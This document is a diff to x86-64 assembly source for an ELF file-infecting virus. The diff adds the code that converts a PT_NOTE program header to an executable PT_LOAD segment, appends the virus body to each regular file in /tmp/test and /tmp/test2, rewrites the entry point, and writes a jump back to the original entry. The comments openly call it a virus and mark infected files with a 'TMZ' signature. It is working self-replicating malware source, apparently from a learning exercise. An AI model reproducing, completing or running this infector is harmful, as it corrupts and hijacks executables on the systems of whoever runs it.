@@ -27,6 +27,9 @@
 %define argv0			[rsp + 8]
 %define argc			[rsp + 4]
 
+
+%define PF_X	1
+%define PF_R	4
 ; r15 + 0 = stack buffer = stat
 ; r15 + 48 = stat.st_size
 
@@ -64,11 +67,11 @@ _start:
     push rsp
     sub rsp, 5000                                               ; reserving 5000 bytes
     mov r15, rsp  
-	call dirent
+	call set_folder ;/tmp/test
+	call set_folder2
 	call exit
-	dirent:
-		push "."                                                ; pushing "." to stack (rsp)
-		mov rdi, rsp                                            ; moving "." to rdi
+	dirent:                                            ; pushing "." to stack (rsp)
+		pop rdi                                           ; moving "." to rdi
 		mov rsi, O_RDONLY
 		xor rdx, rdx                                            ; not using any flags
 		mov rax, SYS_OPEN
@@ -92,11 +95,13 @@ _start:
 		syscall
 		
 		xor rcx, rcx
+	
 	for_each_file:
 		push rcx
-		cmp byte [r15 + 418 + rcx], DT_REG
+		cmp byte [r15 + 418 + rcx], DT_REG  ; if its a regular file
 		jne .continue
 		.open_target_file:
+			; call print_dot
             lea rdi, [rcx + r15 + 419]                          ; dirent.d_name = [r15 + 419]
             mov rsi, O_RDWR
             xor rdx, rdx
@@ -167,7 +172,7 @@ _start:
 
 				; writing virus body to EOF
 				mov rdi, r9                                     ; r9 contains fd
-				lea rsi, [rbp + _start]                        ; loading v_start address in rsi
+				lea rsi, [rbp + _start]                        ; loading _start address in rsi
 				mov rdx, exit - _start                       ; virus size
 				mov r10, rax                                    ; rax contains target EOF offset from previous syscall
 				mov rax, SYS_PWRITE64
@@ -177,6 +182,78 @@ _start:
 
 				cmp rax, 0
 				jle .close_file
+
+		            .patch_phdr:
+                mov dword [r15 + 208], PT_LOAD                  ; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
+                mov dword [r15 + 212], PF_R | PF_X             ; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4)
+                pop rax                                         ; restoring target EOF offeset into rax
+                mov [r15 + 216], rax                            ; phdr.offset [r15 + 216] = target EOF offset
+                mov r13, [r15 + 48]                             ; storing target stat.st_size from [r15 + 48] in r13
+                add r13, 0xc000000                              ; adding 0xc000000 to target file size
+                mov [r15 + 224], r13                            ; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)
+                mov qword [r15 + 256], 0x200000                 ; set phdr.align in [r15 + 256] to 2mb
+                add qword [r15 + 240], exit - _start + 5     ; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
+                add qword [r15 + 248], exit - _start + 5     ; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry
+
+                ; writing patched phdr
+                mov rdi, r9                                     ; r9 contains fd
+                mov rsi, r15                                    ; rsi = r15 = stack buffer address
+                lea rsi, [r15 + 208]                            ; rsi = phdr = [r15 + 208]
+                mov dx, word [r15 + 198]                        ; ehdr.phentsize from [r15 + 198]
+                mov r10, r14                                    ; phdr from [r15 + 208]
+                mov rax, SYS_PWRITE64
+                syscall
+
+                cmp rax, 0
+                jbe .close_file
+
+            .patch_ehdr:
+                ; patching ehdr
+                mov r14, [r15 + 168]                            ; storing target original ehdr.entry from [r15 + 168] in r14
+                mov [r15 + 168], r13                            ; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)
+                mov r13, 0x005a4d54                             ; loading virus signature into r13 (TMZ in little-endian)
+                mov [r15 + 152], r13                            ; adding the virus signature to ehdr.pad in [r15 + 152]
+
+                ; writing patched ehdr
+                mov rdi, r9                                     ; r9 contains fd
+                lea rsi, [r15 + 144]                            ; rsi = ehdr = [r15 + 144]
+                mov rdx, 64                              ; ehdr.size
+                mov r10, 0                                      ; ehdr.offset
+                mov rax, SYS_PWRITE64
+                syscall
+
+                cmp rax, 0
+                jbe .close_file
+
+            .write_patched_jmp:
+                ; getting target new EOF
+                mov rdi, r9                                     ; r9 contains fd
+                mov rsi, 0                                      ; seek offset 0
+                mov rdx, SEEK_END
+                mov rax, SYS_LSEEK
+                syscall                                         ; getting target EOF offset in rax
+
+                ; creating patched jmp
+                mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
+                add rdx, 5
+                sub r14, rdx
+                sub r14, exit - _start
+                mov byte [r15 + 300 ], 0xe9
+                mov dword [r15 + 301], r14d
+
+                ; writing patched jmp to EOF
+                mov rdi, r9                                     ; r9 contains fd
+                lea rsi, [r15 + 300]                            ; rsi = patched jmp in stack buffer = [r15 + 208]
+                mov rdx, 5                                      ; size of jmp rel
+                mov r10, rax                                    ; mov rax to r10 = new target EOF
+                mov rax, SYS_PWRITE64
+                syscall
+
+                cmp rax, 0
+                jbe .close_file
+
+                mov rax, SYS_SYNC                               ; commiting filesystem caches to disk
+                syscall
 		.close_file:
 			mov rax, SYS_CLOSE                                  ; close source fd in rdi
 			syscall
@@ -216,6 +293,21 @@ cleanup:
     ; pop rsp
     ; pop rdx
 	jmp exit
+print_dot:
+	push rbx
+	mov rdi, 1
+	mov rsi, r14
+	mov rdx, 1
+	mov rax, 0x1
+	syscall
+	pop rbx
+	ret
+set_folder:
+	call dirent
+	db `/tmp/test\0`
+set_folder2:
+	call dirent
+	db `/tmp/test2\0`
 err:
 	mov rax, SYS_EXIT
 	mov rdi, 0xfffffff
